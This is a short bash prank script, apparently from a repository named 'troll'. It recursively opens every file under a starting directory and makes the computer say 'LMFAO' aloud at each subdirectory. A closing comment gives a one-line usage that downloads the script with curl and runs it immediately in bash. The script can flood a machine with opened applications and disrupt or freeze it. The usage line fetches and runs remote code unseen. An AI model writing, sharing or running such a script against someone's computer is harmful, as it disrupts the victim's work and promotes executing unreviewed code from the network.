#!/bin/bash

# Function to recursively traverse directories and open files
traverse_and_open() {
    local dir="$1"
    for item in "$dir"/*; do
        if [ -d "$item" ]; then
            say LMFAO
            traverse_and_open "$item"
        elif [ -f "$item" ]; then
            # If the item is a file, open it with the appropriate command
            echo "Opening file: $item"
            if [[ "$OSTYPE" == "darwin"* ]]; then
                # macOS
                open "$item"
            else
                # Linux
                xdg-open "$item"
            fi
        fi
    done
}

# Starting directory (default to the current directory if not provided)
start_dir="${1:-.}"

# Traverse and open files starting from the specified directory
traverse_and_open "$start_dir"

# usage: bash <(curl -s https://raw.githubusercontent.com/RyanFu08/troll/main/open_files.sh)
